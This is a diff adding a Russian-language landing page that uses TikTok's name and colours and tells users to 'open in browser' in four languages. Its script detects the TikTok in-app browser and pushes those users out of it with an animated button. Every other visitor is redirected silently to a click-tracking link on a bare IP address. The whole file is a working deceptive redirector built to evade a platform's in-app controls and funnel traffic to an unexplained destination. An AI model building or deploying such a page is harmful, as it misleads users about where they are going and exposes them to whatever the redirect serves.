@@ -1,0 +1,321 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title data-i18n="title">Откройте в браузере | TikTok</title>
+    <style>
+        :root {
+            --primary: #25F4EE;
+            --secondary: #FE2C55;
+            --black: #000000;
+            --white: #FFFFFF;
+            --gray: #8A8B91;
+        }
+
+        
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, 'Open Sans', 'Helvetica Neue', sans-serif;
+        }
+        
+        body {
+            background-color: var(--black);
+            color: var(--white);
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+        }
+        
+        .container {
+            max-width: 500px;
+            width: 100%;
+            text-align: center;
+            padding: 30px;
+            background: rgba(255, 255, 255, 0.05);
+            border-radius: 16px;
+            backdrop-filter: blur(10px);
+            border: 1px solid rgba(255, 255, 255, 0.1);
+        }
+        
+        .logo {
+            width: 80px;
+            height: 80px;
+            margin-bottom: 20px;
+            fill: var(--white);
+        }
+        
+        h1 {
+            font-size: 24px;
+            margin-bottom: 20px;
+            color: var(--white);
+        }
+        
+        .steps {
+            text-align: left;
+            margin: 25px 0;
+            padding: 0 15px;
+        }
+        
+        .step {
+            display: flex;
+            align-items: flex-start;
+            margin-bottom: 20px;
+            color: var(--white);
+        }
+        
+        .step-number {
+            background: linear-gradient(45deg, var(--primary), var(--secondary));
+            color: var(--black);
+            width: 24px;
+            height: 24px;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin-right: 15px;
+            flex-shrink: 0;
+            font-size: 14px;
+            font-weight: bold;
+        }
+        
+        .step-text {
+            padding-top: 2px;
+            font-size: 16px;
+            line-height: 1.5;
+        }
+        
+        .open-button {
+            background: linear-gradient(45deg, var(--primary), var(--secondary));
+            color: var(--black);
+            border: none;
+            padding: 15px 30px;
+            font-size: 18px;
+            border-radius: 8px;
+            cursor: pointer;
+            font-weight: 600;
+            margin: 20px 0;
+            width: 100%;
+            max-width: 280px;
+            transition: all 0.3s ease;
+            text-decoration: none;
+            display: inline-block;
+        }
+        
+        .open-button:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 4px 15px rgba(37, 244, 238, 0.4);
+        }
+        
+        .browser-icon {
+            vertical-align: middle;
+            margin-left: 8px;
+            width: 20px;
+            height: 20px;
+        }
+        
+        .note {
+            font-size: 14px;
+            color: var(--gray);
+            margin-top: 15px;
+            line-height: 1.5;
+        }
+        
+        /* Удален переключатель языков */
+        
+        @media (max-width: 480px) {
+            .container {
+                padding: 20px 15px;
+            }
+            
+            h1 {
+                font-size: 20px;
+            }
+            
+            .open-button {
+                padding: 12px 20px;
+                font-size: 16px;
+            }
+            
+            .step-text {
+                font-size: 14px;
+            }
+        }
+    </style>
+</head>
+<body>
+    
+    <div class="container">
+        <svg class="logo" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
+            <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-1 17.93c-3.95-.49-7-3.85-7-7.93 0-.62.08-1.21.21-1.79L9 15v1c0 1.1.9 2 2 2v1.93zm6.9-2.54c-.26-.81-1-1.39-1.9-1.39h-1v-3c0-.55-.45-1-1-1H8v-2h2c.55 0 1-.45 1-1V7h2c1.1 0 2-.9 2-2v-.41c2.93 1.19 5 4.06 5 7.41 0 2.08-.8 3.97-2.1 5.39z"/>
+        </svg>
+        
+        <h1 data-i18n="openInBrowser">Откройте в браузере</h1>
+        
+        <div class="steps">
+            <div class="step">
+                <div class="step-number">1</div>
+                <div class="step-text" data-i18n="step1">Нажмите на кнопку меню (три точки) в правом верхнем углу</div>
+            </div>
+            
+            <div class="step">
+                <div class="step-number">2</div>
+                <div class="step-text" data-i18n="step2">Выберите "Открыть в браузере" или "Открыть в Chrome"</div>
+            </div>
+            
+            <div class="step">
+                <div class="step-number">3</div>
+                <div class="step-text" data-i18n="step3">Наслаждайтесь контентом в полной версии сайта</div>
+            </div>
+        </div>
+        
+        <a href="http://174.138.14.47/click?lp=1" class="open-button" id="openButton">
+            <span data-i18n="openInBrowserBtn">Открыть в браузере</span>
+            <svg class="browser-icon" viewBox="0 0 24 24" fill="currentColor">
+                <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-1 17.93c-3.95-.49-7-3.85-7-7.93 0-.62.08-1.21.21-1.79L9 15v1c0 1.1.9 2 2 2v1.93zm6.9-2.54c-.26-.81-1-1.39-1.9-1.39h-1v-3c0-.55-.45-1-1-1H8v-2h2c.55 0 1-.45 1-1V7h2c1.1 0 2-.9 2-2v-.41c2.93 1.19 5 4.06 5 7.41 0 2.08-.8 3.97-2.1 5.39z"/>
+            </svg>
+        </a>
+        
+        <p class="note" data-i18n="note">Для полного доступа к контенту откройте эту страницу в браузере вашего устройства</p>
+    </div>
+    
+    <script>
+        // Определение устройства и браузера
+        const userAgent = navigator.userAgent.toLowerCase();
+        const isIOS = /iphone|ipad|ipod/.test(userAgent);
+        const isAndroid = /android/.test(userAgent);
+        const isTikTokApp = /tiktok/.test(userAgent);
+
+        // Языковые настройки
+        const translations = {
+            ru: {
+                title: "Откройте в браузере | TikTok",
+                openInBrowser: "Откройте в браузере",
+                step1: "Нажмите на кнопку меню (три точки) в правом верхнем углу",
+                step2: "Выберите \"Открыть в браузере\" или \"Открыть в Chrome\"",
+                step3: "Наслаждайтесь контентом в полной версии сайта",
+                openInBrowserBtn: "Открыть в браузере",
+                note: "Для полного доступа к контенту откройте эту страницу в браузере вашего устройства"
+            },
+            en: {
+                title: "Open in Browser | TikTok",
+                openInBrowser: "Open in Browser",
+                step1: "Tap the menu button (three dots) in the top right corner",
+                step2: "Select \"Open in Browser\" or \"Open in Chrome\"",
+                step3: "Enjoy the content in the full version of the site",
+                openInBrowserBtn: "Open in Browser",
+                note: "For full access to the content, open this page in your device's browser"
+            },
+            es: {
+                title: "Abrir en el navegador | TikTok",
+                openInBrowser: "Abrir en el navegador",
+                step1: "Toca el botón de menú (tres puntos) en la esquina superior derecha",
+                step2: "Selecciona \"Abrir en el navegador\" o \"Abrir en Chrome\"",
+                step3: "Disfruta del contenido en la versión completa del sitio",
+                openInBrowserBtn: "Abrir en el navegador",
+                note: "Para acceder a todo el contenido, abre esta página en el navegador de tu dispositivo"
+            },
+            pt: {
+                title: "Abrir no navegador | TikTok",
+                openInBrowser: "Abrir no navegador",
+                step1: "Toque no botão de menu (três pontos) no canto superior direito",
+                step2: "Selecione \"Abrir no navegador\" ou \"Abrir no Chrome\"",
+                step3: "Aproveite o conteúdo na versão completa do site",
+                openInBrowserBtn: "Abrir no navegador",
+                note: "Para ter acesso total ao conteúdo, abra esta página no navegador do seu dispositivo"
+            }
+        };
+
+        // Функция для перевода страницы
+        function setLanguage(lang) {
+            // Устанавливаем атрибут lang у html
+            document.documentElement.lang = lang;
+            
+            // Переводим все элементы с атрибутом data-i18n
+            const elements = document.querySelectorAll('[data-i18n]');
+            elements.forEach(element => {
+                const key = element.getAttribute('data-i18n');
+                if (translations[lang] && translations[lang][key]) {
+                    element.textContent = translations[lang][key];
+                }
+            });
+            
+            // Обновляем title
+            document.title = translations[lang].title || document.title;
+        }
+
+        // Определяем язык браузера
+        function getBrowserLanguage() {
+            const browserLang = (navigator.language || navigator.userLanguage || 'en').toLowerCase();
+            if (browserLang.startsWith('es')) return 'es';
+            if (browserLang.startsWith('pt')) return 'pt';
+            if (browserLang.startsWith('ru')) return 'ru';
+            return 'en'; // По умолчанию английский
+        }
+
+        // Инициализация
+        document.addEventListener('DOMContentLoaded', () => {
+            // Устанавливаем язык
+            const lang = getBrowserLanguage();
+            setLanguage(lang);
+            
+            // Устанавливаем язык
+            setLanguage(getBrowserLanguage());
+            
+            // Функция для открытия в браузере
+            function openInExternalBrowser() {
+                // Пробуем открыть ссылку в новом окне
+                const newWindow = window.open('http://174.138.14.47/click?lp=1', '_system');
+                
+                // Если не получилось (например, в некоторых встроенных браузерах)
+                if (!newWindow || newWindow.closed || typeof newWindow.closed === 'undefined') {
+                    // Показываем инструкцию
+                    const instruction = document.createElement('div');
+                    instruction.className = 'instruction';
+                    instruction.style.marginTop = '20px';
+                    instruction.style.padding = '15px';
+                    instruction.style.background = 'rgba(255,255,255,0.1)';
+                    instruction.style.borderRadius = '8px';
+                    instruction.innerHTML = `
+                        <p style="margin-bottom: 10px; font-weight: bold;">Не удалось открыть автоматически. Сделайте вручную:</p>
+                        <p>1. Нажмите на три точки в правом верхнем углу</p>
+                        <p>2. Выберите "Открыть в браузере" или скопируйте ссылку и вставьте в браузер</p>
+                    `;
+                    document.querySelector('.container').appendChild(instruction);
+                    
+                    // Прокручиваем к инструкции
+                    instruction.scrollIntoView({ behavior: 'smooth' });
+                }
+            }
+
+            // Если пользователь в приложении TikTok, показываем инструкцию
+            if (isTikTokApp) {
+                // Показываем инструкцию
+                document.querySelector('.container').style.display = 'block';
+                
+                // Добавляем анимацию для привлечения внимания
+                const button = document.getElementById('openButton');
+                setInterval(() => {
+                    button.style.transform = 'scale(1.05)';
+                    setTimeout(() => {
+                        button.style.transform = 'scale(1)';
+                    }, 500);
+                }, 2000);
+                
+                // Обработчик клика по кнопке
+                button.addEventListener('click', function(e) {
+                    e.preventDefault();
+                    openInExternalBrowser();
+                });
+            } else {
+                // Если пользователь уже в браузере, перенаправляем сразу
+                window.location.href = "http://174.138.14.47/click?lp=1";
+            }
+        });
+    </script>
+</body>
+</html>
